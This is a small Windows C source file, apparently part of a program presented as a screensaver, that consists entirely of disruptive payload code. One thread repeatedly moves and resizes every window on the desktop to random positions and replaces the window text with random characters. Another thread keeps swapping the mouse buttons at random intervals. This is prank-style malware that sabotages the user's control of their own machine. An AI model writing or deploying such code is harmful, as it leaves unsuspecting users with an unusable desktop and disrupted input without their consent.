#include "screensaver.h"

DWORD WINAPI WindowPayloadThread(LPVOID lv)
{
	for (;;)
	{
		EnumChildWindows(GetDesktopWindow(), WindowPayloadProc, 0);
		Sleep(10000);
	} lv;
}

BOOL CALLBACK WindowPayloadProc(HWND hWnd, LPARAM lParam)
{
	INT w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	INT h = GetSystemMetrics(SM_CYVIRTUALSCREEN);

	INT x = Xorshift32() % w;
	INT y = Xorshift32() % h;
	INT ww = Xorshift32() % w;
	INT wh = Xorshift32() % h;

	MoveWindow(hWnd, x, y, ww, wh, TRUE);

	WCHAR szText[256];
	GetRandomChars(szText, _countof(szText));

	SendMessageW(hWnd, WM_SETTEXT, 0, (LPARAM)szText);

	lParam; return TRUE;
}

DWORD WINAPI MouseButtonSwappingThread(LPVOID lv)
{
	for (;;)
	{
		SwapMouseButton(Xorshift32() % 2);
		Sleep(Xorshift32() % 500);
	} lv;
}